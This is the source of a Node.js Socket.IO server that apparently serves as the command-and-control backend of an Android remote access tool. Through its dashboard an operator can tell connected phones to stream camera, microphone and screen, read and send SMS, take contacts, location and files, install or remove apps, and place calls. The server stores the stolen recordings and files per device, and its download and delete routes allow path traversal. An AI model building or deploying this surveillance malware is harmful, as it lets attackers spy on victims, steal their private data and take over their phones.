const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*' },
    maxHttpBufferSize: 100 * 1024 * 1024,
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '100mb' }));

// Create devices directory
const devicesDir = path.join(__dirname, 'devices');
if (!fs.existsSync(devicesDir)) fs.mkdirSync(devicesDir, { recursive: true });

// Store connected devices
const devices = {};
// Store dashboard sockets
const dashboards = {};

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Download recorded files
app.get('/download/:deviceName/:folder/:file', (req, res) => {
    const filePath = path.join(devicesDir, req.params.deviceName, req.params.folder, req.params.file);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

// List recordings
app.get('/api/recordings/:deviceName', (req, res) => {
    const audioDir = path.join(devicesDir, req.params.deviceName, 'Audio');
    if (!fs.existsSync(audioDir)) {
        return res.json({ files: [] });
    }
    const files = fs.readdirSync(audioDir).map(f => ({
        name: f,
        size: fs.statSync(path.join(audioDir, f)).size,
        date: fs.statSync(path.join(audioDir, f)).mtime
    }));
    res.json({ files });
});

// Delete recording
app.delete('/api/recordings/:deviceName/:file', (req, res) => {
    const filePath = path.join(devicesDir, req.params.deviceName, 'Audio', req.params.file);
    if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        res.json({ status: 'deleted' });
    } else {
        res.status(404).send('Not found');
    }
});

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Device registration
    socket.on('register_device', (data) => {
        const deviceId = data.deviceId || socket.id;
        devices[deviceId] = {
            socketId: socket.id,
            socket: socket,
            info: data,
            key: data.key || 'default_key',
            connectedAt: new Date(),
            online: true
        };

        // Create device folder
        const deviceDir = path.join(devicesDir, data.deviceName || deviceId);
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        const audioDir = path.join(deviceDir, 'Audio');
        if (!fs.existsSync(audioDir)) fs.mkdirSync(audioDir, { recursive: true });
        const downloadsDir = path.join(deviceDir, 'Downloads');
        if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });

        console.log(`Device registered: ${data.deviceName} (key: ${data.key})`);

        // Notify dashboards
        broadcastDeviceList();
    });

    // Dashboard registration
    socket.on('register_dashboard', (data) => {
        const key = data.key || '';
        dashboards[socket.id] = {
            socket: socket,
            key: key,
            selectedDevice: null
        };
        console.log(`Dashboard connected with key: ${key}`);

        // Send filtered device list
        sendDeviceListToSocket(socket, key);
    });

    // Dashboard selects device
    socket.on('select_device', (data) => {
        if (dashboards[socket.id]) {
            dashboards[socket.id].selectedDevice = data.deviceId;
        }
    });

    // Forward commands from dashboard to device
    const commandEvents = [
        'start_camera', 'stop_camera',
        'start_audio', 'stop_audio', 'start_audio_record', 'stop_audio_record',
        'start_screen', 'stop_screen',
        'screen_touch', 'screen_swipe', 'press_back', 'press_home', 'press_recents',
        'get_sms', 'send_sms',
        'get_contacts', 'download_contacts',
        'browse_files', 'download_file', 'preview_image', 'delete_file', 'upload_file', 'install_apk',
        'get_apps', 'open_app', 'uninstall_app',
        'show_toast', 'open_url', 'make_call',
        'get_device_info', 'get_location'
    ];

    commandEvents.forEach(event => {
        socket.on(event, (data) => {
            // If from dashboard, forward to selected device
            if (dashboards[socket.id]) {
                const selectedDeviceId = dashboards[socket.id].selectedDevice;
                if (selectedDeviceId && devices[selectedDeviceId]) {
                    devices[selectedDeviceId].socket.emit(event, data || {});
                }
            }
        });
    });

    // Forward data from device to dashboards
    const dataEvents = [
        'camera_frame', 'audio_frame', 'screen_frame',
        'audio_record_status', 'audio_recording_complete',
        'sms_list', 'sms_sent',
        'contacts_list', 'contacts_download',
        'file_list', 'file_download_chunk', 'image_preview', 'file_deleted', 'file_uploaded',
        'apps_list', 'app_opened',
        'phone_notification',
        'device_info', 'location_data'
    ];

    dataEvents.forEach(event => {
        socket.on(event, (data) => {
            // Find which device this is
            let deviceId = null;
            for (const [id, dev] of Object.entries(devices)) {
                if (dev.socketId === socket.id) {
                    deviceId = id;
                    break;
                }
            }

            if (deviceId) {
                // Save recordings
                if (event === 'audio_recording_complete' && data.data) {
                    saveAudioRecording(deviceId, data);
                }

                // Save downloaded files
                if (event === 'file_download_chunk' && data.done) {
                    saveDownloadedFile(deviceId, data);
                }

                // Forward to dashboards watching this device
                for (const [dashId, dash] of Object.entries(dashboards)) {
                    if (dash.selectedDevice === deviceId) {
                        dash.socket.emit(event, data);
                    }
                }
            }
        });
    });

    socket.on('disconnect', () => {
        // Remove from dashboards
        delete dashboards[socket.id];

        // Mark device offline
        for (const [id, dev] of Object.entries(devices)) {
            if (dev.socketId === socket.id) {
                dev.online = false;
                console.log(`Device offline: ${dev.info.deviceName}`);
                broadcastDeviceList();
                break;
            }
        }
    });
});

// File download accumulator
const downloadBuffers = {};

function saveDownloadedFile(deviceId, data) {
    try {
        const deviceName = devices[deviceId]?.info?.deviceName || deviceId;
        const downloadsDir = path.join(devicesDir, deviceName, 'Downloads');
        if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });

        const key = `${deviceId}_${data.fileName}`;
        if (!downloadBuffers[key]) {
            downloadBuffers[key] = [];
        }
        downloadBuffers[key].push(data.data);

        if (data.done) {
            const allData = downloadBuffers[key].join('');
            const buffer = Buffer.from(allData, 'base64');
            fs.writeFileSync(path.join(downloadsDir, data.fileName), buffer);
            delete downloadBuffers[key];
            console.log(`File saved: ${data.fileName}`);
        }
    } catch (e) {
        console.error('Error saving file:', e);
    }
}

function saveAudioRecording(deviceId, data) {
    try {
        const deviceName = devices[deviceId]?.info?.deviceName || deviceId;
        const audioDir = path.join(devicesDir, deviceName, 'Audio');
        if (!fs.existsSync(audioDir)) fs.mkdirSync(audioDir, { recursive: true });

        const fileName = `recording_${Date.now()}.wav`;
        const buffer = Buffer.from(data.data, 'base64');
        fs.writeFileSync(path.join(audioDir, fileName), buffer);
        console.log(`Audio saved: ${fileName}`);

        // Notify dashboards
        for (const [dashId, dash] of Object.entries(dashboards)) {
            if (dash.selectedDevice === deviceId) {
                dash.socket.emit('audio_saved', { fileName, size: buffer.length });
            }
        }
    } catch (e) {
        console.error('Error saving audio:', e);
    }
}

function broadcastDeviceList() {
    for (const [dashId, dash] of Object.entries(dashboards)) {
        sendDeviceListToSocket(dash.socket, dash.key);
    }
}

function sendDeviceListToSocket(socket, key) {
    const filteredDevices = [];
    for (const [id, dev] of Object.entries(devices)) {
        if (dev.key === key) {
            filteredDevices.push({
                deviceId: id,
                deviceName: dev.info.deviceName,
                model: dev.info.model,
                manufacturer: dev.info.manufacturer,
                androidVersion: dev.info.androidVersion,
                online: dev.online,
                connectedAt: dev.connectedAt,
                key: dev.key
            });
        }
    }
    socket.emit('device_list', { devices: filteredDevices });
}

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}`);
});